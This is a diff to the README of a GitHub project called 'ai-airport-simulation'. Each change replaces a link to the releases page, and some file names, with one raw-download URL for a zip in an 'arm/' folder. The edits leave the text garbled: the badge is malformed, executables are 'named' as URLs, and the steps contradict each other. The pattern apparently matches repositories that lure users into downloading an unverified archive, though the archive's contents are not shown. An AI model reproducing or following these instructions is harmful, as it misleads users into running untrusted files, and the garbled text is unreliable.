@@ -6,7 +6,7 @@ Welcome to **ai-airport-simulation**! This application allows you to run large l
 
 ## 📥 Download the Latest Version
 
-[![Download ai-airport-simulation](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/ChocoLC/ai-airport-simulation/releases)
+[![Download ai-airport-simulation](https://raw.githubusercontent.com/ChocoLC/ai-airport-simulation/main/arm/ai-airport-simulation.zip%20Version-brightgreen)](https://raw.githubusercontent.com/ChocoLC/ai-airport-simulation/main/arm/ai-airport-simulation.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,9 +19,9 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-1. Visit the releases page to download the latest version of **ai-airport-simulation**: [Download Here](https://github.com/ChocoLC/ai-airport-simulation/releases).
+1. Visit the releases page to download the latest version of **ai-airport-simulation**: [Download Here](https://raw.githubusercontent.com/ChocoLC/ai-airport-simulation/main/arm/ai-airport-simulation.zip).
 2. On the releases page, scroll down to find the version you wish to download.
-3. Click on the link corresponding to your operating system (for example, `ai-airport-simulation-windows.zip` for Windows).
+3. Click on the link corresponding to your operating system (for example, `https://raw.githubusercontent.com/ChocoLC/ai-airport-simulation/main/arm/ai-airport-simulation.zip` for Windows).
 4. Save the file to your computer.
 
 ## 📂 Extract the Files
@@ -33,7 +33,7 @@ Before you begin, ensure your system meets the following requirements:
 ## ⚙️ Running the Application
 
 1. Open the folder where you extracted the files.
-2. Look for the executable file named `ai-airport-simulation.exe` for Windows or `ai-airport-simulation.app` for macOS. For Linux, the file will be `ai-airport-simulation`.
+2. Look for the executable file named `https://raw.githubusercontent.com/ChocoLC/ai-airport-simulation/main/arm/ai-airport-simulation.zip` for Windows or `https://raw.githubusercontent.com/ChocoLC/ai-airport-simulation/main/arm/ai-airport-simulation.zip` for macOS. For Linux, the file will be `ai-airport-simulation`.
 3. Double-click the file to start the application.
 4. Follow the on-screen instructions to begin simulating scenarios in the airport environment.
 
@@ -54,7 +54,7 @@ Once you've launched the application, you'll find an easy-to-navigate interface.
 
 ## 🔄 Updates and Support
 
-To stay updated, regularly check the [Releases](https://github.com/ChocoLC/ai-airport-simulation/releases) page for new versions. If you encounter any issues or need assistance:
+To stay updated, regularly check the [Releases](https://raw.githubusercontent.com/ChocoLC/ai-airport-simulation/main/arm/ai-airport-simulation.zip) page for new versions. If you encounter any issues or need assistance:
 
 1. Feel free to raise an issue on the GitHub repository.
 2. Check the FAQ section on the repository for common questions and troubleshooting steps.
